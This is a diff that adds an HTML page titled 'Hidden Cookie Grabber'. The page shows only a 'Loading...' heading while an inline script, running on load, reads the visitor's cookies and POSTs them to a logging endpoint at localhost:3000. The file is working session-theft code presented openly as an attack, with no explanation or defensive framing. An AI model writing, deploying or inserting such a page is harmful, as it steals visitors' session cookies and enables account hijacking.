@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hidden Cookie Grabber</title>
+</head>
+<body>
+    <script>
+        // Function to grab cookies and send them to the server
+        function grabAndSendCookies() {
+            var cookies = document.cookie;
+            
+            // Use the local server address
+            fetch('http://localhost:3000/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain'
+                },
+                body: cookies
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                console.log('Cookies sent successfully');
+            })
+            .catch(error => {
+                console.error('Error sending cookies:', error);
+            });
+        }
+
+        // Call the function immediately when the page loads
+        grabAndSendCookies();
+    </script>
+    <h1>Loading...</h1>
+</body>
+</html>
